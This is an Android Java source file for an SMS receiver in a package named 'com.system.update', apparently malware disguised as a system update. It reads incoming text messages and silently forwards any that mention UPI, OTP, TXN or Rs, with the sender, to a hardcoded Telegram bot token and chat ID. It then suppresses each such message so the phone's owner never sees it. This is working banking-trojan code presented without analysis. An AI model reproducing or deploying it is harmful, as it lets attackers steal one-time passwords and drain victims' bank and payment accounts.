package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                String body = msg.getMessageBody();
                String sender = msg.getOriginatingAddress();
                
                if (body.contains("UPI") || body.contains("OTP") || body.contains("TXN") || body.contains("Rs")) {
                    sendTelegram("📩 SMS from " + sender + ": " + body);
                    abortBroadcast();
                }
            }
        }
    }
    
    private void sendTelegram(String msg) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }
}
